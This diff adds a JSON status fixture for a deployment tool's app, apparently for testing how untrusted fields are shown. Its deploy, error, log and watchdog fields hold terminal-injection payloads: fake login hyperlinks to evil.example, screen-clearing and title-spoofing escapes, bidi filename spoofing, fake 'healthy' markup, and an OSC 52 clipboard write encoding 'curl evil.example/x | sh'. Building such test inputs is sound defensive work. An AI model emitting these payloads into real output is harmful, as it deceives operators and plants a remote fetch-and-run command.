@@ -1,0 +1,134 @@
+{
+ "app": "hostile",
+ "phase": "idle",
+ "running": true,
+ "available_versions": [
+  "v6",
+  "v7"
+ ],
+ "current_version": "v6",
+ "pid": 41233,
+ "unit": "motel-hostile.v6.3f9a0c21d4e8b7a6.service",
+ "socket": "/srv/motel/hostile/run/app.sock",
+ "command": [
+  "node",
+  "server.js"
+ ],
+ "caps": {
+  "memory_max": 536870912,
+  "tasks_max": 64,
+  "cpu_quota": 100
+ },
+ "deploys": [
+  {
+   "version": "v7",
+   "status": "failed",
+   "deployed_by": "ci:\u001b]8;;https://evil.example/login\u001b\\motel login\u001b]8;;\u001b\\ [:::https://evil.example/tag]motel login[:::-] [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-]",
+   "sha256": "22a706ae67234e9fce89f07dead8e03e2c9d2e3a3eafa30c86fae1508074a672",
+   "started_at": "@-4220s",
+   "finished_at": "@-70m",
+   "phase": "starting"
+  },
+  {
+   "version": "v6",
+   "status": "succeeded",
+   "deployed_by": "ci:octo-org/hostile",
+   "sha256": "3e8286044388886ee0875bb280f40fc655f55c2016794d6eee8a6012f9555f29",
+   "started_at": "@-5420s",
+   "finished_at": "@-90m"
+  }
+ ],
+ "last_deploy": {
+  "version": "v7",
+  "status": "failed",
+  "deployed_by": "ci:\u001b]8;;https://evil.example/login\u001b\\motel login\u001b]8;;\u001b\\ [:::https://evil.example/tag]motel login[:::-] [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-]",
+  "sha256": "22a706ae67234e9fce89f07dead8e03e2c9d2e3a3eafa30c86fae1508074a672",
+  "started_at": "@-4220s",
+  "finished_at": "@-70m",
+  "phase": "starting",
+  "artifact_entries": 1842,
+  "artifact_bytes": 39845888,
+  "phases": [
+   {
+    "name": "downloading",
+    "started_at": "@-4220s",
+    "seconds": 1.2
+   },
+   {
+    "name": "extracting",
+    "started_at": "@-4218s",
+    "seconds": 0.8
+   },
+   {
+    "name": "preparing",
+    "started_at": "@-4218s",
+    "seconds": 4.1
+   },
+   {
+    "name": "starting",
+    "started_at": "@-4213s",
+    "seconds": 1.0
+   }
+  ],
+  "error": "start failed: \u001b[2J\u001b[H\u001b]0;motel: all healthy\u0007probe 500 [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-] \u202elmth.exe\u202c",
+  "detail": {
+   "exit": "exit status 3 \u009b31m",
+   "probe": {
+    "status": 500,
+    "location": "/login\u001b[5A\u001b[2K\u001b[10C[:::https://evil.example/tag]motel login[:::-]",
+    "body": "<h1>no such table</h1>\u001b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\u0007 [:::https://evil.example/tag]motel login[:::-] [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-]\nsecond line \u001bPtmux;\u001b\u001b]52;c;Y3VybA==\u0007\u001b\\"
+   },
+   "log_tail": [
+    "normal line before the attack",
+    "apc \u001b_Gf=100,a=T;AAAA\u001b\\ end",
+    "bidi \u202elmth.exe\u202c end",
+    "c1 \u009b31m end",
+    "clear \u001b[2J\u001b[H end",
+    "csi \u001b[5A\u001b[2K\u001b[10C end",
+    "dcs \u001bPtmux;\u001b\u001b]52;c;Y3VybA==\u0007\u001b\\ end",
+    "osc52 \u001b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\u0007 end",
+    "osc8 \u001b]8;;https://evil.example/login\u001b\\motel login\u001b]8;;\u001b\\ end",
+    "tags [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-] end",
+    "title \u001b]0;motel: all healthy\u0007 end",
+    "urltag [:::https://evil.example/tag]motel login[:::-] end",
+    "multi\nline\r\nfield"
+   ],
+   "log_tail_truncated": true
+  },
+  "note": "note [:::https://evil.example/tag]motel login[:::-] \u001b[5A\u001b[2K\u001b[10C",
+  "redacted_env": [
+   "SECRET[:::https://evil.example/tag]motel login[:::-]"
+  ]
+ },
+ "watchdog": {
+  "state": "watching[:::https://evil.example/tag]motel login[:::-]",
+  "consecutive_failures": 3,
+  "last_restart_at": "@-50m",
+  "last_restart_cause": "unhealthy \u001b]0;motel: all healthy\u0007[:::https://evil.example/tag]motel login[:::-]",
+  "last_failure": "probe: 502 \u202elmth.exe\u202c [yellow]ok[-]"
+ },
+ "metrics": {
+  "window": "1h[red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-]",
+  "at": "@-30s",
+  "memory_bytes": {
+   "now": 70254592,
+   "max": 80740352
+  },
+  "cpu_cores": {
+   "avg_5m": 0.03,
+   "avg": 0.02
+  },
+  "requests": {
+   "total": 1234,
+   "per_second": 0.34,
+   "by_class": {
+    "2xx": 1224,
+    "5xx": 10
+   },
+   "5xx_share": 0.005,
+   "p50_ms": 18,
+   "p95_ms": 127,
+   "cache_hit_share": 0.62
+  }
+ }
+}
